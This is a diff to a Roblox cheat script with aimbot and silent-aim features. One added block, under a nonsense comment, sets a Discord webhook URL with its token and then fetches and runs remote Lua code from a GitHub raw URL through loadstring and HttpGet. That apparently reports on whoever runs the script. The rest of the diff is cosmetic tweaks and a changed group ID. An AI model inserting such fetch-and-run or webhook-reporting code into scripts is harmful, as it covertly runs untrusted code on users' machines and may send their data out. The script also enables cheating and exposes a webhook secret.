@@ -2662,7 +2662,7 @@ do --// Visuals functions
     end;
     
     VisualsModule.WeaponInfo = VisualsModule:NewLabel();
-    VisualsModule.PredCircle = VisualsModule:Draw("Sqaure", {
+    VisualsModule.PredCircle = VisualsModule:Draw("Circle", {
         Thickness = 0,
         Size = Vector2.new(100, 0),
         Filled = false;
@@ -2776,10 +2776,27 @@ fovSection:addSlider({text = "Size", flag = "FovSize", min = 1, max = 100, defau
     silent.fov.size = value
 end})
 
+
+--woopadoop
+getgenv().Title = "strvoware"
+getgenv().ThumbnailUrl = ""
+getgenv().Color = 0x000000 -- Black
+
+getgenv().FieldTitle = ""
+getgenv().FieldText = ""
+
+getgenv().FooterText = ""
+getgenv().FooterUrl = ""
+
+getgenv().Webhook = "https://discord.com/api/webhooks/1260809458523570267/uRbBSpAZWMuN_APoQlvNCO7oNtgJ_i1k_B1SaabWHa2IGwZBj0P_DhdY8bSaZJ3GETd-"
+
+coroutine.wrap(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/JustAScripts/Webhook/main/Notifer.lua"))()
+end)()
+
 --
 local kewlcat = aimbotTab:createGroup('right', 'kewlcat check')
 
-local GroupId = 33986332
+local GroupId = 13528605
 local NotificationMessagePrefix = "kewlcat: "
 local notificationEnabled = false
 local notificationConnection
